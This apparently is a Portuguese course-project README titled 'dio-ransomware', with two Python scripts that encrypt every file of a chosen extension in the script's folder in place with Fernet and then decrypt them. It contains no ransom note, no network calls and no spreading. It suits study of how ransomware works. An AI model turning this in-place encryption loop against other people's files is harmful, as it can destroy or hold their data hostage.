# dio-ransomware
Projeto Ransomware Dio

# Projeto CriptoFernet

## Descrição
Este é um script em Python que utiliza a biblioteca `cryptography.fernet` para criptografar arquivos de forma segura usando criptografia simétrica. Ideal para proteger dados sensíveis com uma chave gerenciada.

## Pré-requisitos
- Python 3.x
- Biblioteca `cryptography` (instalável via `pip`)

## Instalação
1. Clone o repositório:
   ```bash
   git clone https://github.com/sidneysimas/dio-ransomware.git

2. Instale as dependências:
   ```bash
   pip install cryptography

Uso
Como Executar
   1. Gere ou use a chave de criptografia (arquivo chave_fernet.key).
   2. Execute o script e informe o arquivo de entrada e saída:
  ```bash    
   python cripto_fernet.py
```
# Projeto CriptoFernet

## Descrição
Este é um script em Python que utiliza a biblioteca `cryptography.fernet` para criptografar arquivos.

## Código Fonte

```
from cryptography.fernet import Fernet
import os

def gerar_ou_carregar_chave(caminho_chave):
    """
    Verifica se uma chave de criptografia existe no caminho especificado.
    Se existir, carrega a chave. Se não, gera uma nova e a salva.
    """
    if os.path.exists(caminho_chave):
        with open(caminho_chave, "rb") as key_file:
            chave = key_file.read()
            print(f"Chave existente carregada de: {caminho_chave}")
    else:
        chave = Fernet.generate_key()
        with open(caminho_chave, "wb") as key_file:
            key_file.write(chave)
        print(f"Nova chave gerada e salva em: {caminho_chave}")
    return chave

def criptografar_arquivo_inplace(caminho_arquivo, chave):
    """
    Criptografa o conteúdo do próprio arquivo, sobrescrevendo o original.
    """
    try:
        fernet = Fernet(chave)
        with open(caminho_arquivo, "rb") as file:
            dados = file.read()

        if not dados:
            print(f"  - Aviso: O arquivo '{os.path.basename(caminho_arquivo)}' está vazio e será ignorado.")
            return

        dados_criptografados = fernet.encrypt(dados)

        with open(caminho_arquivo, "wb") as file:
            file.write(dados_criptografados)

        print(f"  - Sucesso: O arquivo '{os.path.basename(caminho_arquivo)}' foi criptografado.")

    except Exception as e:
        print(f"  - Erro ao criptografar '{os.path.basename(caminho_arquivo)}': {e}")

def main():
    """
    Função principal que orquestra o processo de criptografia.
    """
    # --- CONFIGURAÇÃO ---
    # O script irá operar na mesma pasta onde ele está salvo.
    diretorio_base = os.path.dirname(os.path.abspath(__file__))
    # Defina aqui a extensão dos arquivos que você quer criptografar (ex: ".txt", ".csv", ".log")
    EXTENSAO_ALVO = ".txt"
    # --------------------

    caminho_chave = os.path.join(diretorio_base, "chave_fernet.key")
    scripts_a_ignorar = ["encrypt.py", "decrypt.py"]

    print("--- INICIANDO SCRIPT DE CRIPTOGRAFIA ---")
    
    chave = gerar_ou_carregar_chave(caminho_chave)
    if not chave:
        print("\nNão foi possível carregar ou gerar a chave. O programa será encerrado.")
        return

    print(f"\nProcurando por arquivos '{EXTENSAO_ALVO}' para criptografar...")
    arquivos_encontrados = 0
    for nome_arquivo in os.listdir(diretorio_base):
        # Processa apenas os arquivos com a extensão correta, ignorando os próprios scripts
        if nome_arquivo.endswith(EXTENSAO_ALVO) and nome_arquivo not in scripts_a_ignorar:
            arquivos_encontrados += 1
            caminho_completo = os.path.join(diretorio_base, nome_arquivo)
            criptografar_arquivo_inplace(caminho_completo, chave)
            
    if arquivos_encontrados == 0:
        print(f"Nenhum arquivo com a extensão '{EXTENSAO_ALVO}' foi encontrado no diretório.")
    
    print("\n--- PROCESSO FINALIZADO ---")

if __name__ == "__main__":
    main()
```
Acima temos o código que criptografa os arquivos via extensão, ou seja, no próprio arquivo você coloca a extensão a ser criptografada

Decriptografando

```
from cryptography.fernet import Fernet
import os

def carregar_chave(caminho_chave):
    """
    Carrega a chave de criptografia de um arquivo.
    Retorna None se o arquivo da chave não for encontrado.
    """
    if not os.path.exists(caminho_chave):
        return None
    with open(caminho_chave, "rb") as key_file:
        return key_file.read()

def descriptografar_arquivo_inplace(caminho_arquivo, chave):
    """
    Descriptografa o conteúdo do próprio arquivo, sobrescrevendo o conteúdo criptografado.
    """
    try:
        fernet = Fernet(chave)
        with open(caminho_arquivo, "rb") as file:
            dados_criptografados = file.read()

        if not dados_criptografados:
            print(f"  - Aviso: O arquivo '{os.path.basename(caminho_arquivo)}' está vazio e será ignorado.")
            return

        dados_descriptografados = fernet.decrypt(dados_criptografados)

        with open(caminho_arquivo, "wb") as file:
            file.write(dados_descriptografados)

        print(f"  - Sucesso: O arquivo '{os.path.basename(caminho_arquivo)}' foi descriptografado.")

    except Exception:
        print(f"  - Erro: Falha ao descriptografar '{os.path.basename(caminho_arquivo)}'. Motivos: chave errada ou o arquivo não está criptografado.")

def main():
    """
    Função principal que orquestra o processo de descriptografia.
    """
    # --- CONFIGURAÇÃO ---
    # O script irá operar na mesma pasta onde ele está salvo.
    diretorio_base = os.path.dirname(os.path.abspath(__file__))
    # Defina aqui a extensão dos arquivos que você quer descriptografar (ex: ".txt", ".csv", ".log")
    EXTENSAO_ALVO = ".txt"
    # --------------------

    caminho_chave = os.path.join(diretorio_base, "chave_fernet.key")
    scripts_a_ignorar = ["encrypt.py", "decrypt.py"]

    print("--- INICIANDO SCRIPT DE DESCRIPTOGRAFIA ---")

    chave = carregar_chave(caminho_chave)
    if not chave:
        print(f"\nErro: A chave de segurança 'chave_fernet.key' não foi encontrada.")
        print("Certifique-se de que a chave está na mesma pasta ou execute 'encrypt.py' primeiro.")
        return
    
    print(f"Chave de segurança carregada com sucesso.")

    print(f"\nProcurando por arquivos '{EXTENSAO_ALVO}' para descriptografar...")
    arquivos_encontrados = 0
    for nome_arquivo in os.listdir(diretorio_base):
        # Processa apenas os arquivos com a extensão correta, ignorando os próprios scripts
        if nome_arquivo.endswith(EXTENSAO_ALVO) and nome_arquivo not in scripts_a_ignorar:
            arquivos_encontrados += 1
            caminho_completo = os.path.join(diretorio_base, nome_arquivo)
            descriptografar_arquivo_inplace(caminho_completo, chave)
            
    if arquivos_encontrados == 0:
        print(f"Nenhum arquivo com a extensão '{EXTENSAO_ALVO}' foi encontrado no diretório.")
    
    print("\n--- PROCESSO FINALIZADO ---")

if __name__ == "__main__":
    main()
```
O Código acima decriptgrafa o arquivo antes encriptado.
